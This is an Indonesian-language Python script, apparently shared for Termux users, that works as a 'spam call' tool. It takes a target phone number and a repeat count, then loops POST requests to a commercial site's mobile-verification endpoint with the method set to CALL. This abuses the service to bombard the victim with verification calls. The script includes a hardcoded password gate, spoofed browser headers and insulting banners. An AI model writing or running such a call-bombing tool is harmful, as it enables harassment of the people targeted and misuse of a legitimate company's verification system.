#!/user/bin/python
#code by : RAMADHANI :'(
try:
	import os
	import sys
	import time
except:
	print('\t terjadi kesalahan ')
try:
	import requests
except ImportError:
	print('\t module requests belum terinstall')
	os.system('pip install requests')
try:
	from requests import post
except ImportError:
	print('\t periksa kembali koneksi anda ! ')
import datetime
from datetime import datetime; import getpass

raxdpsw = 'TERMUX'
admin_ganteng = 'RAMADHANI'
_rafi_hengker = datetime.now()
_ajg_lu__asu = requests.get('https://api.ipify.org').text
logo = '''
●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
●Toosl Spam Call New 2021 Work●
●Jan Di Recode Ya Bangsat     ●
●Tinggal Pake Apa Susahnya.   ●\t \x1b[1;95m\x1b[1;97m
●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●\x1b[1;91m \x1b[1;97m

╔══════════════════════════════════════════════════
'''
def exit():
	os.system('exit')
	
def __rafi__mmk__ktl():
	os.system('clear')
	print(logo)
	print ('╚══[ IP ANDA : \x1b[1;96m'+_ajg_lu__asu+'\x1b[1;97m ]');time.sleep(1)
	print('║')
	print ('╚══[ DEPELOPER : \x1b[1;96m' +admin_ganteng +'\x1b[1;97m ]');time.sleep(1)
	print('║')
	print ('╚══[ USER : \x1b[1;93m' +__user_nameX +'\x1b[1;97m ]');time.sleep(1)
	print('║')
	print('╚══[ CONTOH INPUT NOMOR :\x1b[1;96m 85812345678 \x1b[1;97m] ');time.sleep(1)
	print("║")
	print('╚══════════════════════════════════════════════════');time.sleep(1)
	print("║")
	__ynkts_lu__wibu = input('╚══[ TARGET NUMBER ] :\x1b[1;96m ');time.sleep(1)
	print("\x1b[1;97m║")
	_rafi_wibu_ngtd = int(input('╚══[ JUMLAH CALL ] :\x1b[1;96m '));time.sleep(1)
	print("\x1b[1;97m║");time.sleep(1)
	url = 'https://id.jagreward.com/member/verify-mobile/'

# yang ini jangan di udah asu
	_rafi_X = {
    "Host": "id.jagreward.com",
    "Connection": "keep-alive",
    #ua nya jangan di ganti ajg ntar emrorrr!!!!:>
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A013G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
    }
#ini juga jangan !!!
	ktl = {
    "method": "CALL",
    "countryCode": "id",
    }

	for x in range(_rafi_wibu_ngtd):
	    r = requests.post(url+__ynkts_lu__wibu, headers=_rafi_X, data=ktl);time.sleep(1)
	    print("╚══[ message : \x1b[1;92m"+r.json()["message"]+"\x1b[1;97m ]")
	    print("║");time.sleep(1)
	    print('╚══════════════════════════════════════════════════');time.sleep(1)
	    print("║")
	    print('╚══[ Jan Di Decode Ya   : \x1b[1;93m'+__user_nameX+' \x1b[1;97m]');time.sleep(5)
        
def _loDAF_rafi():
	try:
		os.system('clear')
		print(logo)
		print('╚══[\x1b[1;96m LOG - IN\x1b[1;97m  ]');time.sleep(1)
		print('║')
		print('╚══[ PASSWORD :\x1b[1;96m ?\x1b[1;97m  ]');time.sleep(1)
		print('║')
		__admin_pasw = input('╚══[ \x1b[1;96mPASSWORD LOGIN Tools\x1b[1;97m ] : ');time.sleep(1)
		if __admin_pasw == raxdpsw:
			print('║')
			print('╚══[\x1b[1;96m  Untung Bisa Login !\x1b[1;97m  ]');time.sleep(1)
			__rafi__mmk__ktl()
		else:
			print('║');time.sleep(1)
			print('╚══[ \x1b[1;91mGoblok Lu Ajg !\x1b[1;97m ]');time.sleep(1)
			_loDAF_rafi()
	except InputError:
		print(' terjadi kesalahan ! ')
			
			
			
			
if __name__ == '__main__':
	os.system('clear')
	print(logo)
	__user_nameX = input('╚══[ \x1b[1;96mSIAPA NAMA ANDA\x1b[1;97m ] : ');time.sleep(1)
	print('║');time.sleep(1)
	print('╚══[ HELLO :\x1b[1;93m '+__user_nameX+'  \x1b[1;97m]');time.sleep(1)
	_loDAF_rafi()
	__rafi__mmk__ktl()
	exit()
